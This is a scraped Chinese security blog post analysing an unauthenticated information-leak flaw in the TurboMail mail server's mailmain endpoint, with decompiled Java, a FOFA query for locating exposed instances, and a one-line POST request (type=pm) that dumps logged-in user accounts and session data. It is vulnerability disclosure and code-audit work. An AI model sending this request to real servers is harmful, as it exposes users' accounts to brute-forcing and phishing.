---
title: "TurboMail mailmain 敏感信息泄露漏洞"
source: https://mrxn.net/jswz/turbomail-mailmain-data-leak.html
asset_dir: assets/turbomail-mailmain-敏感信息泄露漏洞
---

# TurboMail mailmain 敏感信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/26 08:11
* 860浏览
* [0评论](#comment)
* 27分钟阅读

深入探索

电子邮件

邮件

授权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

TurboMail邮件系统是广州拓波软件科技有限公司研发的面向企事业单位通信需求而研发的[电子邮件](#)服务器系统。该系统**mailmain**接口中的**pm**方法存在未授权访问，未授权攻击者可利用该漏洞获取系统用户信息，可能导致进一步的攻击。

# 影响版本

v5.2.0

漏洞修复方案

# fofa语法

> app="TurboMail" || body="maintlogin.jsp" || body="tmw/1/getpassword.jsp"

# 漏洞分析

根据**web.xml**里对**mailmain**的定义

深入探索

SQL

软件

Web安全课程

```
<servlet-mapping>
   <servlet-name>mailmaini</servlet-name>
   <url-pattern>/mailmain</url-pattern>          
</servlet-mapping>

<web-app>
       <servlet>
          <servlet-name>mailmaini</servlet-name>
          <servlet-class>turbomail.web.MailMain</servlet-class>
```

跟进**turbomail.web.MailMain**类看下

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-001-d5eddf28c29f.webp)](https://image.mrxn.net/e261240889a841ac853f55a0d54a9029.webp)

标准的Servlet写法，看下本次漏洞点

电子邮件与即时消息

```
long lCurStart = System.currentTimeMillis();
String intertype = request.getParameter("intertype");
if (intertype != null && intertype.equals("ajax")) {
    AjaxMain.service(request, response);
    long lCurEnd = System.currentTimeMillis();
    MailSession ms = WebUtil.getms(request, response);
    String type = request.getParameter("type");
    if (ms != null) {
        KPIMonitor.setWebResponseTime(type, ms.userinfo.getUid(), ms.userinfo.domain, (int)(lCurEnd - lCurStart));
    } else {
        KPIMonitor.setWebResponseTime(type, "", "", (int)(lCurEnd - lCurStart));
    }

} else {
    String type = request.getParameter("type");
    if (type == null) {
        type = "";
    }

    if (type.equals("login")) {
        Login.login(request, response);
    } else if (type.equals("logout")) {
        Logout.doGet(request, response);
    } else if (type.equals("pm")) {
    PMAdmin.show(false, request, response);
    ......
```

当`intertype=ajax`时会进入`AjaxMain.service`，暂时不管，当**type=pm**时，进入`PMAdmin.show`方法

```
public class PMAdmin {
    private static ArrayList alPM = new ArrayList();

    public static void addPM(PMInterface pm) {
        alPM.add(pm);
    }

    public static void show(boolean bAjax, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PMInterface pm = null;
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < alPM.size(); ++i) {
            pm = (PMInterface)alPM.get(i);
            sb.append(pm.PM());
            sb.append("\r\n");
        }

        String str = sb.toString();
        response.getOutputStream().write(str.getBytes(SysConts.New_InCharSet));
    }
}
```

无任何鉴权或者校验，直接将存储的 `PMInterface` 对象遍历进行遍历，调用其 `PM()` 方法，将结果拼接为多行文本。全部循环遍历后输出在响应里，在看下`PM`方法实现逻辑

物流软件安全

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-002-2cee5092badd.webp)](https://image.mrxn.net/a66b303116d9412a9ea96fe0cc51b2f9.webp)

直接获取系统所有的session后输出数量以及对应的key==》邮箱帐号

SessinonAdmin ht\_usersession user:

# 漏洞复现

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-003-72977c1997ce.webp)](https://image.mrxn.net/a9c40025d24e46f7af6473fa66f73105.webp)

```
POST /mailmain HTTP/1.1
Host: turbomail.mrxn.net
Content-Type: application/x-www-form-urlencoded

type=pm
```

成功获取系统已登录用户帐号信息以及session相关信息，攻击者拿到邮箱帐号后就可能进一步攻击如邮箱密码爆破、钓鱼邮件等等。

网络安全

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-004-97f6eb5ba19d.webp)](https://image.mrxn.net/9a71a6fa045e456d999b430b3649df7e.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[TurboMail mailmain 敏感信息泄露漏洞](https://mrxn.net/jswz/turbomail-mailmain-data-leak.html)  
文章链接：<https://mrxn.net/jswz/turbomail-mailmain-data-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/turbomail-mailmain-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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